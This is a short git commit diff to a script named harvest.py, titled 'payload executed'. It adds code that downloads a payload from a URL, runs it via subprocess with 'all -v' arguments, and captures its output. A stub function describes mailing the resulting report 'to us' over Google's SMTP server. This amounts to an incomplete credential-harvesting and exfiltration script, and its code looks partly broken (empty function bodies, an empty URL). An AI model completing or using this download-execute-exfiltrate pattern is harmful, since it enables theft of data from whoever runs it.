e539cae3b0202775cc593661a06d4c4c728653dc
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-09-02 13:26:04 -0400

    payload executed

--- harvest.py
+++ harvest.py
@@ -10,11 +10,16 @@ def get_payload():
         with open(name, "wb") as payload:
             payload.write(get_request.content)
 
-def execute_it():
-    #execute the downloaded payload using subprocess module
-
 def mail_it():
     #mail the report to us using google smtp server
 
+URL= ""
+get_payload(URL)
+file_name = URL.split("/")[-1]
+process = subprocess.Popen([file_name, 'all', '-v'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+result, error = process.communicate()
+try:
+    message = result.decode('latin-1').encode("utf-8")
+except:
+    message = str(result)
 
-get_payload([payload_url])
